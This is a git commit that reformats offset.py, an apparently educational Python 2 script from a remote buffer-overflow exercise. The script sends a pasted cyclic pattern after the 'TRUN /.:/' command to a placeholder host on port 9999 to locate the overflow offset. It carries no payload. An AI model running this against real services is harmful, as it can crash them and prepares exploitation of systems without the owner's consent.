330dbfdda15ac39c38f920db46bb7759f1ab8952
Josh Giddings <75488156+giddings32@users.noreply.github.com>
2022-08-07 16:59:13 -0400

    Update offset.py

--- Buffer_Overflow/Remote_Buffer_Overflow/offset.py
+++ Buffer_Overflow/Remote_Buffer_Overflow/offset.py
@@ -1,19 +1,19 @@
  #!/usr/bin/python2
-        import sys, socket
+ import sys, socket
 
-        # Change IP and Port on line 13 to Target and Port Application is running on
-        # Change TRUN on line 14 to Command you are testing
-        # Paste Pattern Created into line 8
+# Change IP and Port on line 13 to Target and Port Application is running on
+# Change TRUN on line 14 to Command you are testing
+# Paste Pattern Created into line 8
 
-        offset = ""
+offset = ""
         
-        try:
-            print "\nLocating Offset..."
-            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("x.x.x.x", 9999))
-            s.send(('TRUN /.:/' + offset))
-            s.close()
-  
-        except:            
-            print "\nError Connecting to Server"
-            sys.exit()
+try:
+   print "\nLocating Offset..."
+   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+   s.connect(("x.x.x.x", 9999))
+   s.send(('TRUN /.:/' + offset))
+   s.close()
+
+except:            
+   print "\nError Connecting to Server"
+   sys.exit()
